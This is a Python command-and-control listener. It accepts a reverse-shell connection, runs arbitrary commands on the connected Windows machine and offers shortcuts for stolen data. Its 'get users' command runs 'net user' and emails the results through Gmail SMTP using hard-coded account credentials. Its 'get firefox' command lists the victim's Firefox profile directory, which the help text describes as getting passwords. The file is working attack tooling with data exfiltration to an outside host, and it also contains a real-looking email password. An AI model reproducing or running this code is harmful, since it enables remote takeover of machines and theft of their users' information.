#!/bin/python3

import socket
import signal
import sys
from termcolor import colored
import smtplib
from email.mime.text import MIMEText


def def_handler(sig, frame):
    print(colored(f"\n\n[!] Leaving the Command and Control....\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


class Listener:

    def __init__(self, ip, port):

        self.options = {
            "get users": "List valid users at the system (GMAIL)",
            "help": "Show this help panel",
            "get firefox": 'Get pasword from Firefox' 
        }

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print(f'\n[+] Listening for incoming connections...')

        self.client_socket, client_address = server_socket.accept()

        print(f'\n[+] Connection established by {client_address}\n\n')


    def execute_remote(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()


    def get_users(self):
        self.client_socket.send(b'net user')
        command_output = self.client_socket.recv(2048).decode()
        self.send_email("Users list info - C2", command_output, "valorantlan21@gmail.com", ["valorantlan21@gmail.com"], "djzy agqy iorx lylv")

    
    def send_email(self, subject, body, sender, recipents, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipents)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipents, msg.as_string())
    
        print(colored(f'\n[+] Email send succesfully\n', 'green'))


    def show_help(self):

        print(colored(f'\n[+] Help panel: \n', 'green'))

        for key, value in self.options.items():
            print(colored(f'\t{key} - {value}\n', 'blue'))


    def get_firefox(self):
        self.client_socket.send(b'dir C:\\Users\\sebis\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        command_output = self.client_socket.recv(2048).decode()
        print(command_output)

    def run(self):

        while True:

            command = input(f">> ")
            if command == "get users":
                self.get_users()
            elif command == 'get firefox':
                self.get_firefox()
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remote(command)
                print(command_output)



if __name__ == "__main__":

    my_listener = Listener('192.168.1.122', 443)
    my_listener.run()

